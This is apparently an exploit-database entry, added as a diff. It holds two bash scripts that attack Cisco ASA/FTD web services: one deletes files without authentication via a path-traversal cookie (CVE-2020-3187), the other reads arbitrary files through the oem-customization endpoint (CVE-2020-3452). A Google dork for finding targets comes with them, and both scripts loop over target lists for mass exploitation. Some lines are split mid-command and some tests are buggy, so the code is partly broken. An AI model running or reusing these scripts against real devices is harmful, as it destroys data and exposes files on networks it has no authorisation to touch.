@@ -1,0 +1,189 @@
+# Exploit Title: Cisco Adaptive Security Appliance Software 9.7 - Unauthenticated Arbitrary File Deletion
+# Google Dork: inurl:/+CSCOE+/
+# Date: 2020-08-27
+# Exploit Author:  0xmmnbassel
+# Vendor Homepage: https://www.cisco.com/c/en/us/products/security/asa-firepower-services/index.html#~models
+# Version: Cisco ASA Software  >=9.14 except 9.11   Cisco FTD Software >=6.2.2 and 6.2.3,6.3.0,6.4.0,6.50,6.60
+# Vulnerability Type: unauthenticated file deletion
+# Version: Cisco ASA Software releases 9.5 and earlier, as well as
+# Release 9.7, have reached end of software maintenance. Customers are
+# advised to migrate to a supported release that includes the fix for
+# this vulnerability.
+# CVE : CVE-2020-3187
+
+#!/bin/bash
+
+delete="csco_logo.gif"
+
+
+helpFunction()
+{
+echo ""
+echo -e "\t\tCVE-2020-3187"
+echo ""
+echo "Usage: $0 -l targets.txt -d csco_logo.gif "
+echo -e "\t-l for list of IPs in text file"
+echo -e "\t-d file to be deleted, default: ./+CSCOE+/csco_logo.gif"
+echo -e "\t-i for single IP test"
+exit 1
+}
+
+while getopts "l:d:i:" opt
+do
+case "$opt" in
+l ) input="$OPTARG" ;;
+d ) delete="$OPTARG" ;;
+i ) website="$OPTARG" ;;
+? ) helpFunction ;;
+esac
+done
+
+
+#if $website is empty or $input is empty
+if [ -z "$website" ] && [ -z "$input" ]
+then
+echo "Some/all of the parameters are empty";
+helpFunction
+fi
+
+#usage
+
+if [ -z "$input"];
+then
+status=$(curl -LI $website/+CSCOU+/$delete -o /dev/null -w
+'%{http_code}\n' -s)
+echo "checking if $website has the $delete file"
+if [ $status -eq 200 ]; then
+echo "$website/+CSCOU+/$delete exists, deleting it..."
+curl -H "Cookie: token=..//+CSCOU+/$delete" -v -s -o
+resultsindv.txt $website/+CSCOE+/session_password.html
+delcheck=$(curl -LI $website/+CSCOU+/$delete -o /dev/null -w
+'%{http_code}\n' -s)
+if [ delcheck -eq 404]; then
+echo "Deleted!, $website is vulnerable to CVE-2020-3187."
+else
+echo "Cannot Delete $website/+CSCOU+/$delete file, check it manaully!"
+fi
+else
+echo "$website/+CSCOU+/$delete doesn't exist!"
+fi
+
+else
+while IFS= read -r line
+do
+echo "Checking $line if file $delete exist.."
+#echo $response
+status=$(curl -LI $line/+CSCOU+/$delete -o /dev/null -w
+'%{http_code}\n' -s)
+if [ $status -eq 200 ]; then
+echo "$line/+CSCOU+/$delete exists, deleting it..."
+curl -H "Cookie: token=..//+CSCOU+/$delete" -v -s -o
+results.txt $line/+CSCOE+/session_password.html
+
+#for no verbosity
+#curl -H "Cookie: token=..//+CSCOU+/$delete" -s -o
+results.txt $line/+CSCOE+/session_password.html
+delcheck=$(curl -LI $line/+CSCOU+/$delete -o /dev/null -w
+'%{http_code}\n' -s)
+if [ delcheck -eq 404]; then
+echo "Deleted!, $line is vulnerable to CVE-2020-3187."
+else
+echo "Cannot Delete $line/+CSCOU+/$delete file, check it manaully!"
+fi
+else
+echo "$line/+CSCOU+/$delete doesn't exist!"
+fi
+done < "$input"
+
+
+fi
+
+
+
+
+#!/bin/bash
+
+
+read="%2bCSCOE%2b/portal_inc.lua"
+
+
+helpFunction()
+{
+   echo ""
+   echo -e "\t\tCVE-2020-3452"
+   echo ""
+   echo "Usage: $0 -l targets.txt -r %2bCSCOE%2b/portal_inc.lua "
+   echo -e "\t-l for list of IPs in text file"
+   echo -e "\t-r file to read, default: %2bCSCOE%2b/portal_inc.lua"
+   echo -e "\t-i for single IP test"
+   exit 1
+}
+
+while getopts "l:r:i:" opt
+do
+   case "$opt" in
+      l ) input="$OPTARG" ;;
+      r ) read="$OPTARG" ;;
+      i ) website="$OPTARG" ;;
+      ? ) helpFunction ;;
+   esac
+done
+
+
+
+#if $website is empty or $input is empty
+if [  -z "$website"  ] && [ -z "$input" ]
+then
+   echo "Some/all of the parameters are empty";
+   helpFunction
+fi
+
+#usage
+
+
+if [ -z "$website"];
+  then
+  while IFS= read -r line
+  do
+    name=$(echo $line | cut -c9-19)
+    #echo "testing $line"
+    filename="$name.txt"
+      #echo $response
+      status=$(curl -LI  $line"/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name="$read  -o /dev/null   -w '%{http_code}\n' -s)
+
+      if [ $status -eq "400" ]; then
+        echo "$line/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read doesn't exist!"
+      else
+        wget  "$line/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read" -O $name.txt
+
+        if [ -s $filename ]; then
+          echo "$line/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read exists, reading $read..."
+            echo "downloaded!, $line is vulnerable to CVE-2020-3452."
+
+        else
+          echo "not vulnerable!"
+          rm -rf $filename
+        fi
+      fi
+    done < "$input"
+  else
+
+  name=$(echo $website | cut -c9-16)
+  filename="$name.txt"
+
+  status=$(curl -LI  $website"/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name="$read  -o /dev/null   -w '%{http_code}\n' -s)
+  if [ $status -eq "Bad Request" ]; then
+    echo "$website/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read doesn't exist!"
+  else
+
+    echo "$website/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read exists, reading $read..."
+    wget  "$website/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=$read" -O $name.txt
+    if [ -s $filename ]; then
+      echo "downloaded!, $website is vulnerable to CVE-2020-3452."
+    else
+      echo "not vulnerable!"
+      rm -rf $filename
+    fi
+  fi
+
+fi
